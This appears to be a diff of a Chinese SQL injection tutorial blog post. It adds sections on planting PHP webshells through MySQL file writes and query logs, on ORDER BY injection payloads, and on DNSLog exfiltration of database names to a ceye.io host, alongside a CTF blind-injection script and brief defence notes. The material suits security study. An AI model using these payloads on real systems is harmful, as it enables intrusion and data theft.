@@ -25,7 +25,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/failure.ico">
 <meta property="article:published_time" content="2023-01-10T02:35:56.000Z">
-<meta property="article:modified_time" content="2023-11-12T06:28:18.316Z">
+<meta property="article:modified_time" content="2024-03-26T07:11:37.711Z">
 <meta property="article:author" content="Err0r2333">
 <meta property="article:tag" content="SQL_Injection">
 <meta name="twitter:card" content="summary">
@@ -178,7 +178,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~28.95K
+                        ~35.90K
                     
                     字
                 </li>
@@ -195,7 +195,7 @@
             
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
                 <div class="icon"><i class="fa fa-warning"></i></div>
-                <div class="text"><p>本文最后编辑于 <time datetime="1699770498316"></time> 前，其中的内容可能需要更新。</p></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1711437097711"></time> 前，其中的内容可能需要更新。</p></div>
             </div>
             
             
@@ -349,6 +349,14 @@
 <p>前提需要知道字段名：</p>
 <p>爆当前查询语句的库、表、字段：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select flag from ctf where polygon(id);</span><br><span class="line">#Illegal non geometric &#x27;`test`. `ctf`.`id`&#x27; value</span><br><span class="line">select flag from ctf where polygon(flag);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>修复方法:</p>
+<ol>
+<li>上waf，过滤掉能够造成报错注入的函数</li>
+<li>万能预处理语句</li>
+<li>不要在页面上</li>
+</ol>
+</blockquote>
 <h2><span id="3堆叠注入"> 3.堆叠注入</span></h2>
 <p>在SQL中（以及在很多的地方中），分号表示命令的分隔，也就是SQL语句的结束，如果使用;后再在后面构造SQL语句，两条是可以一起执行的,例如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;update users set password=&#x27;123456&#x27; where id=1;#</span><br></pre></td></tr></table></figure>
@@ -460,7 +468,7 @@
 <p><code>*</code>如果被过滤，可以利用某一个字段代替：</p>
 <p>如：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select max(A.TABLE_NAME) from information_schema.columns A, information_schema.columns B, information_schema.schemata;</span><br></pre></td></tr></table></figure>
-<p><strong>正则匹配</strong></p>
+<p><strong>正则匹配，相当于新的sleep函数</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select rpad(&#x27;a&#x27;,99,&#x27;a&#x27;) rlike concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;);</span><br></pre></td></tr></table></figure>
 <h2><span id="6headers注入"> 6.headers注入</span></h2>
 <p>就是利用上面的方式，换了个注入点…</p>
@@ -632,7 +640,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables;</span><br><span class="line">show variables like &quot;%file%&quot;;</span><br></pre></td></tr></table></figure>
 <p>设置权限：</p>
 <p><strong>secure_file_priv</strong></p>
-<p>限制文件的读、写</p>
+<p>限制文件的读、写。secure_file_priv只能够通过<code>my.ini</code>来配置，不能够通过sql语言进行修改</p>
 <p>查看权限：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;%secure_file%&quot;;</span><br></pre></td></tr></table></figure>
 <ul>
@@ -644,8 +652,48 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;/flag&#x27;);</span><br></pre></td></tr></table></figure>
 <p>读文件配合盲注：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://34163922-8c1d-4c8b-ae9b-332f18511a0a.challenge.ctf.show:8080/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyz-&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span> : <span class="string">&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;</span>.<span class="built_in">format</span>(flag+j),</span><br><span class="line">            <span class="string">&quot;password&quot;</span> : <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        r = requests.post(url,data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">r&quot;\u5bc6\u7801\u9519\u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag = flag+j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2><span id="mysql写shell"> mysql写shell</span></h2>
 <p>写文件：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php phpinfo();?&gt;&quot; into outfile &quot;/tmp/1.php&quot;#多行</span><br><span class="line">select &quot;&lt;?php phpinfo();?&gt;&quot; into dumpfile &quot;/tmp/1.php&quot;#仅一行</span><br></pre></td></tr></table></figure>
+<ul>
+<li>要知道web的绝对路径</li>
+<li>web要有文件的写入权限</li>
+<li>数据库有<code>secure_file_priv</code>设置</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,&quot;shell&quot;,3 into outfile &quot;/var/www/html/1.php&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#windows下：</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,&quot;shell&quot;,<span class="number">3</span> <span class="keyword">into</span> outfile &quot;C:\\phpstudy\\WWW\\xxx&quot;#</span><br></pre></td></tr></table></figure>
+<p>除了<code>into outfile</code>和<code>into dumpfile</code>以外，还有以下几种函数/语句可以写</p>
+<p><code>lines terminated by</code>：在每行终止的位置添加内容</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1 into outfile &quot;xxx&quot; lines terminated by &quot;shell&quot;#</span></span><br></pre></td></tr></table></figure>
+<p>对应的还有<code>lines started by</code>：在每行起始的位置添加</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">into</span> <span class="keyword">out</span> file &quot;xxx&quot; lines starting <span class="keyword">by</span> &quot;shell&quot;;</span><br></pre></td></tr></table></figure>
+<p><code>fields terminated by</code>：可以理解成在每个字段处添加</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">into</span> <span class="keyword">out</span> file &quot;xxx&quot; fields terminated <span class="keyword">by</span> &quot;shell&quot;;</span><br></pre></td></tr></table></figure>
+<p><code>columns terminated by</code>：可以理解在每一列添加</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">into</span> <span class="keyword">out</span> file &quot;xxx&quot; columns terminated <span class="keyword">by</span> &quot;shell&quot;;</span><br></pre></td></tr></table></figure>
+<p>sqlmap：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">写入到 /tmp 目录下 (要写的文件，必须在kali本机里有)</span></span><br><span class="line">sqlmap -u &quot;http://127.0.0.1/index.php?page=user-info.php&amp;username=a%27f%27v&amp;password=afv&amp;user-info-php-submit-button=View+Account+Details&quot; -p &#x27;username&#x27;  --file-write=&quot;shell.php&quot;  --file-dest=&quot;/tmp/shell.php&quot;</span><br></pre></td></tr></table></figure>
+<p>日志写shell：</p>
+<p><code>phpmyadmin</code>里常见：</p>
+<p>需要设置<code>general_log</code>和<code>general_log_file</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="string">&#x27;on&#x27;</span>; #开启日志记录</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;需要记录日志的位置.php&#x27;</span>;#将日志保存到路径，需要绝对路径，设置成网站的目录</span><br></pre></td></tr></table></figure>
+<p>然后只需要select一下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+<p>这样就把这条语句记录到日志里了，日志还是php，所以自然就有马了</p>
+<p>但是还有问题，比如在windows下，设置<code>secure_file_priv</code>在C盘下，但是网站搭载在D盘的话，这样即使将<code>general_log_file</code>修改为C盘下的文件也是连不上的，除非有文件包含</p>
+<blockquote>
+<p>这种方式的条件比较苛刻：</p>
+<p>不能够union注入，因为写日志的时候需要set general_log_file，而union注入是不能够执行set的</p>
+<p>要有堆叠注入(mysqli_multi_query)，不常见(常用mysqli_query)</p>
+<p>或者你能够登入别的数据库或者phpmyadmin里</p>
+<p>没有对单双引号进行过滤</p>
+</blockquote>
+<p>慢查询日志写shell</p>
+<p>在mysql&gt;5.6.34以后secure_file_priv的值默认为null。</p>
+<p>mysql里有一种日志叫慢查询日志，它用于记录在mysql中响应时间超过阈值的语句，默认阈值(<code>long_query_time</code>)为10，时间超过这个参数的查询语句会被sql记录到慢查询日志中</p>
+<p>使用慢查询主要针对日志量庞大，通过日志文件getshell出现问题的情况</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;%slow%&quot;;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log_file<span class="operator">=</span>&quot;xxx.php&quot;;#慢查询日志的保存路径</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> slow_query_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> log_queries_not_using_indexes<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;shell&#x27;</span> <span class="keyword">or</span> sleep(<span class="number">10</span>); #确保查询时间够长</span><br></pre></td></tr></table></figure>
+<p>如果查询的时候对敏感字符进行了过滤(<code>如php</code>)，可以利用CONCAT拼接或者REPLACE替换</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span>CONCAT(&quot;/var/www/html/shell.p&quot;,&quot;hp&quot;); </span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span>REPLACE(&quot;/var/www/html/shell.jpg&quot;,&quot;jpg&quot;,&quot;php&quot;); </span><br></pre></td></tr></table></figure>
 <h1><span id="0x07-各种表"> 0x07 各种表</span></h1>
 <h3><span id="information_schema"> information_schema</span></h3>
 <p>平时注入比较常用的表：</p>
@@ -884,11 +932,130 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;/**/union/**/select/**/REPLACE(REPLACE(&#x27;&quot;/**/union/**/select/**/REPLACE(REPLACE(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;,0x22,0x27),0x25,&#x27;&quot;/**/union/**/select/**/REPLACE(REPLACE(&quot;%&quot;,0x22,0x27),0x25,&quot;%&quot;)#&#x27;)#</span><br></pre></td></tr></table></figure>
 <p>方法2：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;union/**/select/**/mid(`11`,65,217)/**/from(select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,1</span><br><span class="line">4,15,16,17/**/union/**/select/**/*/**/from/**/performance_schema.threads/**/where/**/na</span><br><span class="line">me/**/like&#x27;%connection%&#x27;/**/limit/**/1,1)t#</span><br></pre></td></tr></table></figure>
+<h1><span id="0x0a-排序注入"> 0x0A 排序注入</span></h1>
+<p>讲到排序注入，就不得不说到mysql的一种防御方式叫预编译</p>
+<p>预编译是啥呢，其实就是将一些灵活的参数值(可以理解成用户传的参数值)以占位符<code>?</code>的形式代替，然后让语句模板化。进行预编译之后sql语句就已经被分析优化了，并且是以参数化的形式来执行，所以即使有敏感字符，数据库也会当作属性值来处理而不是sql指令</p>
+<p>预编译的形式通常是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;dbConnect.php&#x27;</span>; <span class="comment">#已经包含了数据库的连接</span></span><br><span class="line"><span class="comment">//假设需要两个参数username和password:</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">//$sql = &quot;SELECT * FROM users WHERE username = &#x27;$username&#x27; AND password = &#x27;$password&#x27;&quot;;</span></span><br><span class="line">    <span class="variable">$mysqli_stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>);</span><br><span class="line">    <span class="variable">$mysqli_stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">    <span class="variable">$mysqli_stmt</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$user</span>, <span class="variable">$pass</span>);</span><br><span class="line">    <span class="variable">$mysqli_stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 从结果集中获取所有数据</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="variable">$mysqli_stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>())) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;登录成功！&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;用户名或密码错误&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>或者一个更加普遍的形式：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DBConnect.getConnection();</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot; SELECT xxx FROM xxx WHERE xxx = ? &quot;</span>;</span><br><span class="line">ps = conn.prepareStatement(sql);</span><br><span class="line">ps.setString(<span class="number">1</span>, xxx); <span class="comment">//或者ps.setInt(1, username);</span></span><br><span class="line">rs = ps.executeQuery(); </span><br></pre></td></tr></table></figure>
+<p>此时我们输入<code>1' or '1'='1</code>时，预编译好的sql语句是这样的：</p>
+<p><code>'1' or '1'='1'</code>(也就是再加上一个单引号)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot; SELECT xxx FROM xxx WHERE xxx = &#x27;1&#x27; or &#x27;1&#x27;=&#x27;1&#x27; &quot;</span></span><br></pre></td></tr></table></figure>
+<p>此时就无法攻击了</p>
+<p>那接下来说回排序注入</p>
+<p>排序注入一般出现在<code>order by</code>：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String <span class="keyword">sql</span> <span class="operator">=</span> &quot; SELECT xxx FROM xxx WHERE xxx =&#x27;xxx&#x27; order by xxx&quot;;</span><br></pre></td></tr></table></figure>
+<p>这里拿sql-labs的lesson48来做测试就好了</p>
+<h2><span id="挖掘思路"> 挖掘思路</span></h2>
+<p>请求的参数中的关键词有<code>order=</code>，<code>sort=</code>，<code>orderby=</code>等</p>
+<p>等于号后面有<code>asc desc</code>等</p>
+<p>例如某接口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxxx.com/xxx/xxx/xxx/getAreaSpotPageList?&amp;pageindex=1&amp;pagesize=20&amp;passAreaId=2&amp;orderby=pass_area_spot_id+desc&amp;userId=1181163&amp;hotelId=5&amp;brandId=5</span><br></pre></td></tr></table></figure>
+<p>这个接口是一个比较正常的get类型的获取数据接口</p>
+<p>但是有一个<code>orderby</code>参数比较显眼</p>
+<p>而且传递的参数值为<code>pass_area_spot_id+desc</code>，而<code>desc</code>是sql中的降序排序</p>
+<p>发现<code>orderby=pass_area_spot_id+desc</code>与<code>orderby=pass_area_spot_id+asc</code>返回的数据不一致</p>
+<h2><span id="检测方法"> 检测方法</span></h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">,1 &amp;&amp; ,0</span><br><span class="line">,1/1 &amp;&amp; ,1/0</span><br><span class="line">,exp(7) &amp;&amp; ,exp(710) //exp得看数据库的版本，高版本下不太行</span><br><span class="line">异或</span><br><span class="line">(select*from(select+sleep(3)union/**/select+1)a) //基于时间盲注的辅助判断</span><br></pre></td></tr></table></figure>
+<p>例如:</p>
+<p><code>AdminID+desc,exp(7)</code>正常</p>
+<img src="/posts/35462/17.png" class title="awa">
+<p>而</p>
+<p><code>AdminID+desc,exp(710)</code>会溢出，导致响应时间过长：</p>
+<img src="/posts/35462/18.png" class title="awa">
+<p>基于时间的检测判断：</p>
+<img src="/posts/35462/21.png" class title="awa">
+<p>可见访问了3秒左右，代表存在该漏洞</p>
+<h2><span id="利用方式"> 利用方式</span></h2>
+<p>这个时候就可以利用了，建议条件为真时溢出(利于判断)</p>
+<p>payload修改一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdminID+desc,if(user()+like+&#x27;r%&#x27;,exp(710),exp(7))</span><br></pre></td></tr></table></figure>
+<img src="/posts/35462/19.png" class title="awa">
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdminID+desc,if(user()+like+&#x27;c%&#x27;,exp(710),exp(7))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">利用方式其实就是desc,然后加上注入语句</span><br></pre></td></tr></table></figure>
+<p>报错：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx <span class="keyword">desc</span>, updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,database()),<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
+<img src="/posts/35462/22.png" class title="awa">
+<p>盲注(bool)：</p>
+<p>这里也可以写基于二分的，如果正确页面回显正常，如果错误页面会回显<code>Subquery returns more than 1 row</code>(也有可能是别的)</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:pass_area_spot_id+desc,<span class="keyword">if</span>(ascii(substr(database(),? ,<span class="number">1</span>))=?,<span class="number">1</span>,(<span class="keyword">select</span>%<span class="number">201</span>%<span class="number">20</span>from%<span class="number">20i</span>nformation_schema.tables))</span><br></pre></td></tr></table></figure>
+<p>盲注(time)：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pass_area_spot_id+desc,if(ascii(substr(database(),? ,1))=?,1,sleep(3))</span><br></pre></td></tr></table></figure>
+<h2><span id="为什么预编译不能够防止order-by导致的注入"> 为什么预编译不能够防止order by导致的注入</span></h2>
+<p>其实这里可以换一个方法来问这个问题。</p>
+<p>还记得预编译是什么吗？</p>
+<blockquote>
+<p>进行预编译之后sql语句就已经被分析优化了，并且是以参数化的形式来执行，所以即使有敏感字符，数据库也会当作属性值来处理而不是sql指令</p>
+</blockquote>
+<p>那么这个问题就可以转化成<code>order by</code>为什么不能够被参数化执行了</p>
+<p>说回<code>order by</code>，<code>order by</code>的语法一般是<code>order by [字段名] [desc/asc]</code></p>
+<p>如果对order by之后的输入进行参数化就会导致sql语句出错:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot; SELECT xxx FROM xxx WHERE xxx = &#x27;xxx&#x27; order by &#x27;xxx&#x27; &quot;</span></span><br></pre></td></tr></table></figure>
+<p>这个时候<strong>order by 后面的 xxx其实是一个字符串，而不是字段名，导致sql查询出错</strong></p>
+<p>引自原文：</p>
+<blockquote>
+<p>那么为什么预编译的函数在参数化时非要把输入加上引号呢？如果没有引号不就可以防御order by注入了吗？是的，但确实没有不加引号的预编译的方法</p>
+</blockquote>
+<p>那就是说引申一下，预编译防止不了<code>order by</code>导致的sql注入，也防御不了任何需要字符串并且不能够加引号的地方可能导致的sql注入</p>
+<p>因为不能参数化的位置不管怎么拼接，最终都是和直接使用加号连接的方法一致</p>
+<h2><span id="防御方式"> 防御方式</span></h2>
+<p>既然预编译防不了group by，那要怎么防御呢？</p>
+<p>可以采取白名单的方式</p>
+<p>因为<strong>order by 之后跟的字段名是有限的，而且肯定是数据库中已经存在的字段，所以只要对这些有限的字段设置白名单，其他的输入统一报错，那么就解决了</strong></p>
+<h1><span id="0x0b-dnslog"> 0x0B DNSLog</span></h1>
+<p>什么是DNSLog?</p>
+<p>DNS就是将域名解析为ip。用户在浏览器上输入一个<code>A.com</code>，就要靠DNS服务器将A.com解析到它的真实ip，这样就可以访问到该真实ip上的服务</p>
+<p>如何利用DNSLog进行注入呢？</p>
+<h2><span id="dnslog回显原理"> DNSLog回显原理</span></h2>
+<p>Internet采用层次树状结构命名方法，域是名字空间中的一个可被管理的划分。域还可以被分成子域，子域还能够再被划分，<strong>从右向左分别是顶级域名，二级域名，三级域名</strong>，如<code>tieba.baidu.com</code>，而且域名不分大小写</p>
+<p>DNSLog的回显方式是这样的：</p>
+<blockquote>
+<p>假设我ping %USERNAME%.a.com</p>
+<p>此时回显的结果会是Ping 请求找不到主机 kang_.a.com</p>
+</blockquote>
+<p>因为系统在ping之前先把<code>%USERNAME%</code>的值解析出来和<code>a.com</code>拼接起来</p>
+<p>再和ping命令执行将<code>kang_.a.com</code>发给DNS服务器请求解析</p>
+<p>这个过程被记录下来就称DNSLog</p>
+<p><strong>原理上只要能够进行DNS请求的函数都可能存在DNSLog注入</strong></p>
+<p>DNSLog能用在哪些地方？</p>
+<blockquote>
+<ol>
+<li>SQL盲注。因为在sql注入的时候为布尔盲注、时间盲注的时候注入的效率低而且线程高的时候就容易被waf拦截，又或者目标站点无回显</li>
+<li>无回显rce。这个不多说</li>
+<li>无回显ssrf</li>
+<li>xss</li>
+<li>xxe</li>
+</ol>
+</blockquote>
+<p>推荐的DNSLog网址：</p>
+<p><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a><br>
+<a target="_blank" rel="noopener" href="http://admin.dnslog.link/">http://admin.dnslog.link</a><br>
+<a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a></p>
+<h2><span id="dnslog打sql盲注"> DNSLog打SQL盲注</span></h2>
+<p>这里就需要我们的<code>load_file</code>函数了，这个函数可以进行DNS请求。但是这个trick只适用于windows系统。因为windows上有一个叫<strong>UNC</strong>路径的东西</p>
+<p>这是个什么玩意呢？</p>
+<p>其实是一个windows上的一个访问方式，其实就是我们的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\abc.xx\test</span><br></pre></td></tr></table></figure>
+<p>这种反斜杠的访问方式</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxxx.ceye.io\\abc&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure>
+<p>过程是这样的：</p>
+<ul>
+<li>恶意sql注入传递到数据库执行<code>database()</code>函数，假设返回的数据库名字叫<code>security</code></li>
+<li>此时dns查询变成了<code>security.xxx.ceye.io</code></li>
+<li>然后带着这个查询去查询dns服务器(<a target="_blank" rel="noopener" href="http://xn--security-lq8q829z.xxx.ceye.io">查询security.xxx.ceye.io</a>)</li>
+<li>dns服务器返回了一个NS服务器地址<code>xxx.ceye.io</code></li>
+<li>向NS服务器查询<code>security.xxx.ceye.io</code></li>
+<li>ND服务器上获取到了DNSLog，查询到了数据库的值</li>
+</ul>
 <hr>
 <p>参考资料：</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="http://t.csdn.cn/tPnPY">sql注入详解</a></li>
 <li><a target="_blank" rel="noopener" href="http://t.csdn.cn/iubh9">[RCTF2015]EasySQL 1</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/70f83c2be2ad">由order by排序注入实战引发的思考 - 简书 (jianshu.com)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Xy--1/p/12896599.html">DNSlog注入学习 - Lushun - 博客园 (cnblogs.com)</a></li>
 </ul>
 </div>
         </div>
@@ -981,7 +1148,7 @@
                     <a class="tag-none-link" href="/tags/SQL-Injection/" rel="tag">SQL_Injection</a>
                 </div>
                 <div class="pull-date">
-                    <time datetime="2023-11-12T06:28:18.316Z" itemprop="dateModified">最后编辑：2023-11-12</time>
+                    <time datetime="2024-03-26T07:11:37.711Z" itemprop="dateModified">最后编辑：2024-03-26</time>
                 </div>
             </div>
         </footer>
